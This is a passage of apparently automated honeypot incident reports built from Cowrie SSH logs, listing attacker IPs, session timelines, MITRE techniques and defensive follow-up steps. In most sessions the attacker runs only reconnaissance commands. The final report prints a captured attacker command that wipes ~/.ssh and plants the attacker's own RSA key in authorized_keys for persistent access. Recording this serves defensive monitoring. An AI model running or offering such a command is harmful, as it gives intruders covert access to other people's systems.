| **Source IP** | `47.236.228[.]211` |
| **First Seen** | 2026-09-07 19:50 |
| **Last Seen** | 2026-09-07 19:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:50:11` | `cowrie.session.connect` |
| `2026-09-07 19:50:11` | `cowrie.client.version` |
| `2026-09-07 19:50:11` | `cowrie.client.kex` |
| `2026-09-07 19:50:12` | `cowrie.login.success` |
| `2026-09-07 19:50:13` | `cowrie.session.params` |
| `2026-09-07 19:50:13` | `cowrie.command.input` |
| `2026-09-07 19:50:13` | `cowrie.log.closed` |
| `2026-09-07 19:50:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.236.228[.]211` to AbuseIPDB if not already reported
- [ ] Block `47.236.228[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c489c517eb7a

| Field | Detail |
|---|---|
| **Source IP** | `47.236.228[.]211` |
| **First Seen** | 2026-09-07 19:50 |
| **Last Seen** | 2026-09-07 19:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:50:13` | `cowrie.session.connect` |
| `2026-09-07 19:50:13` | `cowrie.client.version` |
| `2026-09-07 19:50:14` | `cowrie.client.kex` |
| `2026-09-07 19:50:15` | `cowrie.login.success` |
| `2026-09-07 19:50:16` | `cowrie.session.params` |
| `2026-09-07 19:50:16` | `cowrie.command.input` |
| `2026-09-07 19:50:16` | `cowrie.log.closed` |
| `2026-09-07 19:50:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.236.228[.]211` to AbuseIPDB if not already reported
- [ ] Block `47.236.228[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4995a9abe8a3

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 19:50 |
| **Last Seen** | 2026-09-07 19:50 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:50:16` | `cowrie.session.connect` |
| `2026-09-07 19:50:16` | `cowrie.client.version` |
| `2026-09-07 19:50:16` | `cowrie.client.kex` |
| `2026-09-07 19:50:19` | `cowrie.login.success` |
| `2026-09-07 19:50:21` | `cowrie.session.params` |
| `2026-09-07 19:50:21` | `cowrie.command.input` |
| `2026-09-07 19:50:21` | `cowrie.log.closed` |
| `2026-09-07 19:50:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34b7a69bbd01

| Field | Detail |
|---|---|
| **Source IP** | `47.236.228[.]211` |
| **First Seen** | 2026-09-07 19:50 |
| **Last Seen** | 2026-09-07 19:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:50:17` | `cowrie.session.connect` |
| `2026-09-07 19:50:17` | `cowrie.client.version` |
| `2026-09-07 19:50:17` | `cowrie.client.kex` |
| `2026-09-07 19:50:18` | `cowrie.login.success` |
| `2026-09-07 19:50:20` | `cowrie.session.params` |
| `2026-09-07 19:50:20` | `cowrie.command.input` |
| `2026-09-07 19:50:20` | `cowrie.log.closed` |
| `2026-09-07 19:50:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.236.228[.]211` to AbuseIPDB if not already reported
- [ ] Block `47.236.228[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b925763b16f7

| Field | Detail |
|---|---|
| **Source IP** | `47.236.228[.]211` |
| **First Seen** | 2026-09-07 19:50 |
| **Last Seen** | 2026-09-07 19:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:50:20` | `cowrie.session.connect` |
| `2026-09-07 19:50:20` | `cowrie.client.version` |
| `2026-09-07 19:50:21` | `cowrie.client.kex` |
| `2026-09-07 19:50:21` | `cowrie.login.success` |
| `2026-09-07 19:50:22` | `cowrie.session.params` |
| `2026-09-07 19:50:22` | `cowrie.command.input` |
| `2026-09-07 19:50:23` | `cowrie.log.closed` |
| `2026-09-07 19:50:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.236.228[.]211` to AbuseIPDB if not already reported
- [ ] Block `47.236.228[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84dc1f264acc

| Field | Detail |
|---|---|
| **Source IP** | `47.236.228[.]211` |
| **First Seen** | 2026-09-07 19:50 |
| **Last Seen** | 2026-09-07 19:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:50:23` | `cowrie.session.connect` |
| `2026-09-07 19:50:23` | `cowrie.client.version` |
| `2026-09-07 19:50:23` | `cowrie.client.kex` |
| `2026-09-07 19:50:24` | `cowrie.login.success` |
| `2026-09-07 19:50:25` | `cowrie.session.params` |
| `2026-09-07 19:50:25` | `cowrie.command.input` |
| `2026-09-07 19:50:25` | `cowrie.log.closed` |
| `2026-09-07 19:50:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.236.228[.]211` to AbuseIPDB if not already reported
- [ ] Block `47.236.228[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c09245cb799b

| Field | Detail |
|---|---|
| **Source IP** | `47.236.228[.]211` |
| **First Seen** | 2026-09-07 19:50 |
| **Last Seen** | 2026-09-07 19:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:50:26` | `cowrie.session.connect` |
| `2026-09-07 19:50:26` | `cowrie.client.version` |
| `2026-09-07 19:50:26` | `cowrie.client.kex` |
| `2026-09-07 19:50:27` | `cowrie.login.success` |
| `2026-09-07 19:50:29` | `cowrie.session.params` |
| `2026-09-07 19:50:29` | `cowrie.command.input` |
| `2026-09-07 19:50:29` | `cowrie.log.closed` |
| `2026-09-07 19:50:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.236.228[.]211` to AbuseIPDB if not already reported
- [ ] Block `47.236.228[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89e218e8f56d

| Field | Detail |
|---|---|
| **Source IP** | `47.236.228[.]211` |
| **First Seen** | 2026-09-07 19:50 |
| **Last Seen** | 2026-09-07 19:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:50:30` | `cowrie.session.connect` |
| `2026-09-07 19:50:30` | `cowrie.client.version` |
| `2026-09-07 19:50:30` | `cowrie.client.kex` |
| `2026-09-07 19:50:31` | `cowrie.login.success` |
| `2026-09-07 19:50:32` | `cowrie.session.params` |
| `2026-09-07 19:50:32` | `cowrie.command.input` |
| `2026-09-07 19:50:32` | `cowrie.log.closed` |
| `2026-09-07 19:50:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.236.228[.]211` to AbuseIPDB if not already reported
- [ ] Block `47.236.228[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85dd1495c0a4

| Field | Detail |
|---|---|
| **Source IP** | `47.236.228[.]211` |
| **First Seen** | 2026-09-07 19:50 |
| **Last Seen** | 2026-09-07 19:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:50:33` | `cowrie.session.connect` |
| `2026-09-07 19:50:33` | `cowrie.client.version` |
| `2026-09-07 19:50:33` | `cowrie.client.kex` |
| `2026-09-07 19:50:34` | `cowrie.login.success` |
| `2026-09-07 19:50:35` | `cowrie.session.params` |
| `2026-09-07 19:50:35` | `cowrie.command.input` |
| `2026-09-07 19:50:35` | `cowrie.log.closed` |
| `2026-09-07 19:50:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.236.228[.]211` to AbuseIPDB if not already reported
- [ ] Block `47.236.228[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-290da3f0ea0e

| Field | Detail |
|---|---|
| **Source IP** | `47.236.228[.]211` |
| **First Seen** | 2026-09-07 19:50 |
| **Last Seen** | 2026-09-07 19:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:50:36` | `cowrie.session.connect` |
| `2026-09-07 19:50:36` | `cowrie.client.version` |
| `2026-09-07 19:50:36` | `cowrie.client.kex` |
| `2026-09-07 19:50:38` | `cowrie.login.success` |
| `2026-09-07 19:50:40` | `cowrie.session.params` |
| `2026-09-07 19:50:40` | `cowrie.command.input` |
| `2026-09-07 19:50:40` | `cowrie.log.closed` |
| `2026-09-07 19:50:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.236.228[.]211` to AbuseIPDB if not already reported
- [ ] Block `47.236.228[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed57cc0f27bc

| Field | Detail |
|---|---|
| **Source IP** | `47.236.228[.]211` |
| **First Seen** | 2026-09-07 19:50 |
| **Last Seen** | 2026-09-07 19:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:50:41` | `cowrie.session.connect` |
| `2026-09-07 19:50:41` | `cowrie.client.version` |
| `2026-09-07 19:50:41` | `cowrie.client.kex` |
| `2026-09-07 19:50:42` | `cowrie.login.success` |
| `2026-09-07 19:50:43` | `cowrie.session.params` |
| `2026-09-07 19:50:43` | `cowrie.command.input` |
| `2026-09-07 19:50:43` | `cowrie.log.closed` |
| `2026-09-07 19:50:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.236.228[.]211` to AbuseIPDB if not already reported
- [ ] Block `47.236.228[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0f722ce3233

| Field | Detail |
|---|---|
| **Source IP** | `47.236.228[.]211` |
| **First Seen** | 2026-09-07 19:50 |
| **Last Seen** | 2026-09-07 19:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:50:44` | `cowrie.session.connect` |
| `2026-09-07 19:50:44` | `cowrie.client.version` |
| `2026-09-07 19:50:44` | `cowrie.client.kex` |
| `2026-09-07 19:50:45` | `cowrie.login.success` |
| `2026-09-07 19:50:46` | `cowrie.session.params` |
| `2026-09-07 19:50:46` | `cowrie.command.input` |
| `2026-09-07 19:50:46` | `cowrie.log.closed` |
| `2026-09-07 19:50:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.236.228[.]211` to AbuseIPDB if not already reported
- [ ] Block `47.236.228[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9901a50fd570

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 19:50 |
| **Last Seen** | 2026-09-07 19:50 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:50:45` | `cowrie.session.connect` |
| `2026-09-07 19:50:46` | `cowrie.client.version` |
| `2026-09-07 19:50:46` | `cowrie.client.kex` |
| `2026-09-07 19:50:48` | `cowrie.login.success` |
| `2026-09-07 19:50:50` | `cowrie.session.params` |
| `2026-09-07 19:50:50` | `cowrie.command.input` |
| `2026-09-07 19:50:51` | `cowrie.log.closed` |
| `2026-09-07 19:50:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5c908e2c7ab

| Field | Detail |
|---|---|
| **Source IP** | `47.236.228[.]211` |
| **First Seen** | 2026-09-07 19:50 |
| **Last Seen** | 2026-09-07 19:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:50:46` | `cowrie.session.connect` |
| `2026-09-07 19:50:46` | `cowrie.client.version` |
| `2026-09-07 19:50:47` | `cowrie.client.kex` |
| `2026-09-07 19:50:48` | `cowrie.login.success` |
| `2026-09-07 19:50:49` | `cowrie.session.params` |
| `2026-09-07 19:50:49` | `cowrie.command.input` |
| `2026-09-07 19:50:50` | `cowrie.log.closed` |
| `2026-09-07 19:50:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.236.228[.]211` to AbuseIPDB if not already reported
- [ ] Block `47.236.228[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-657dc86ddd5b

| Field | Detail |
|---|---|
| **Source IP** | `47.236.228[.]211` |
| **First Seen** | 2026-09-07 19:50 |
| **Last Seen** | 2026-09-07 19:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:50:50` | `cowrie.session.connect` |
| `2026-09-07 19:50:50` | `cowrie.client.version` |
| `2026-09-07 19:50:50` | `cowrie.client.kex` |
| `2026-09-07 19:50:52` | `cowrie.login.success` |
| `2026-09-07 19:50:53` | `cowrie.session.params` |
| `2026-09-07 19:50:53` | `cowrie.command.input` |
| `2026-09-07 19:50:53` | `cowrie.log.closed` |
| `2026-09-07 19:50:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.236.228[.]211` to AbuseIPDB if not already reported
- [ ] Block `47.236.228[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-084f9711a43c

| Field | Detail |
|---|---|
| **Source IP** | `47.236.228[.]211` |
| **First Seen** | 2026-09-07 19:50 |
| **Last Seen** | 2026-09-07 19:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:50:53` | `cowrie.session.connect` |
| `2026-09-07 19:50:53` | `cowrie.client.version` |
| `2026-09-07 19:50:53` | `cowrie.client.kex` |
| `2026-09-07 19:50:55` | `cowrie.login.success` |
| `2026-09-07 19:50:56` | `cowrie.session.params` |
| `2026-09-07 19:50:56` | `cowrie.command.input` |
| `2026-09-07 19:50:56` | `cowrie.log.closed` |
| `2026-09-07 19:50:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.236.228[.]211` to AbuseIPDB if not already reported
- [ ] Block `47.236.228[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49e3079b5a7e

| Field | Detail |
|---|---|
| **Source IP** | `47.236.228[.]211` |
| **First Seen** | 2026-09-07 19:50 |
| **Last Seen** | 2026-09-07 19:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:50:56` | `cowrie.session.connect` |
| `2026-09-07 19:50:56` | `cowrie.client.version` |
| `2026-09-07 19:50:56` | `cowrie.client.kex` |
| `2026-09-07 19:50:57` | `cowrie.login.success` |
| `2026-09-07 19:50:59` | `cowrie.session.params` |
| `2026-09-07 19:50:59` | `cowrie.command.input` |
| `2026-09-07 19:50:59` | `cowrie.log.closed` |
| `2026-09-07 19:50:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.236.228[.]211` to AbuseIPDB if not already reported
- [ ] Block `47.236.228[.]211` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-959ea359ace5

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 19:51 |
| **Last Seen** | 2026-09-07 19:51 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:51:14` | `cowrie.session.connect` |
| `2026-09-07 19:51:15` | `cowrie.client.version` |
| `2026-09-07 19:51:15` | `cowrie.client.kex` |
| `2026-09-07 19:51:17` | `cowrie.login.success` |
| `2026-09-07 19:51:19` | `cowrie.session.params` |
| `2026-09-07 19:51:19` | `cowrie.command.input` |
| `2026-09-07 19:51:19` | `cowrie.log.closed` |
| `2026-09-07 19:51:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a5fcbcc77fd

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 19:51 |
| **Last Seen** | 2026-09-07 19:51 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:51:43` | `cowrie.session.connect` |
| `2026-09-07 19:51:44` | `cowrie.client.version` |
| `2026-09-07 19:51:44` | `cowrie.client.kex` |
| `2026-09-07 19:51:46` | `cowrie.login.success` |
| `2026-09-07 19:51:48` | `cowrie.session.params` |
| `2026-09-07 19:51:48` | `cowrie.command.input` |
| `2026-09-07 19:51:48` | `cowrie.log.closed` |
| `2026-09-07 19:51:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d76817fd708

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 19:52 |
| **Last Seen** | 2026-09-07 19:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:52:12` | `cowrie.session.connect` |
| `2026-09-07 19:52:13` | `cowrie.client.version` |
| `2026-09-07 19:52:13` | `cowrie.client.kex` |
| `2026-09-07 19:52:15` | `cowrie.login.success` |
| `2026-09-07 19:52:17` | `cowrie.session.params` |
| `2026-09-07 19:52:17` | `cowrie.command.input` |
| `2026-09-07 19:52:17` | `cowrie.log.closed` |
| `2026-09-07 19:52:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6906ea8bbd6e

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 19:52 |
| **Last Seen** | 2026-09-07 19:52 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:52:41` | `cowrie.session.connect` |
| `2026-09-07 19:52:42` | `cowrie.client.version` |
| `2026-09-07 19:52:42` | `cowrie.client.kex` |
| `2026-09-07 19:52:44` | `cowrie.login.success` |
| `2026-09-07 19:52:46` | `cowrie.session.params` |
| `2026-09-07 19:52:46` | `cowrie.command.input` |
| `2026-09-07 19:52:46` | `cowrie.log.closed` |
| `2026-09-07 19:52:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-929cb6711950

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 19:53 |
| **Last Seen** | 2026-09-07 19:53 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:53:10` | `cowrie.session.connect` |
| `2026-09-07 19:53:11` | `cowrie.client.version` |
| `2026-09-07 19:53:11` | `cowrie.client.kex` |
| `2026-09-07 19:53:13` | `cowrie.login.success` |
| `2026-09-07 19:53:15` | `cowrie.session.params` |
| `2026-09-07 19:53:15` | `cowrie.command.input` |
| `2026-09-07 19:53:16` | `cowrie.log.closed` |
| `2026-09-07 19:53:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cc019d902a2

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 19:53 |
| **Last Seen** | 2026-09-07 19:53 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:53:40` | `cowrie.session.connect` |
| `2026-09-07 19:53:40` | `cowrie.client.version` |
| `2026-09-07 19:53:40` | `cowrie.client.kex` |
| `2026-09-07 19:53:43` | `cowrie.login.success` |
| `2026-09-07 19:53:44` | `cowrie.session.params` |
| `2026-09-07 19:53:44` | `cowrie.command.input` |
| `2026-09-07 19:53:45` | `cowrie.log.closed` |
| `2026-09-07 19:53:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42a757afc438

| Field | Detail |
|---|---|
| **Source IP** | `165.232.44[.]201` |
| **First Seen** | 2026-09-07 19:54 |
| **Last Seen** | 2026-09-07 19:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:54:09` | `cowrie.session.connect` |
| `2026-09-07 19:54:09` | `cowrie.client.version` |
| `2026-09-07 19:54:09` | `cowrie.client.kex` |
| `2026-09-07 19:54:11` | `cowrie.login.success` |
| `2026-09-07 19:54:13` | `cowrie.session.params` |
| `2026-09-07 19:54:13` | `cowrie.command.input` |
| `2026-09-07 19:54:13` | `cowrie.log.closed` |
| `2026-09-07 19:54:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.232.44[.]201` to AbuseIPDB if not already reported
- [ ] Block `165.232.44[.]201` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e035d2b4b92

| Field | Detail |
|---|---|
| **Source IP** | `210.79.142[.]201` |
| **First Seen** | 2026-09-07 19:54 |
| **Last Seen** | 2026-09-07 19:54 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-07 19:54:15` | `cowrie.session.connect` |
| `2026-09-07 19:54:15` | `cowrie.client.version` |
| `2026-09-07 19:54:16` | `cowrie.client.kex` |
| `2026-09-07 19:54:17` | `cowrie.login.success` |
| `2026-09-07 19:54:18` | `cowrie.session.params` |
| `2026-09-07 19:54:18` | `cowrie.command.input` |
| `2026-09-07 19:54:18` | `cowrie.command.failed` |
| `2026-09-07 19:54:18` | `cowrie.log.closed` |
| `2026-09-07 19:54:19` | `cowrie.session.params` |
| `2026-09-07 19:54:19` | `cowrie.command.input` |
| `2026-09-07 19:54:19` | `cowrie.session.file_download` |
| `2026-09-07 19:54:19` | `cowrie.log.closed` |
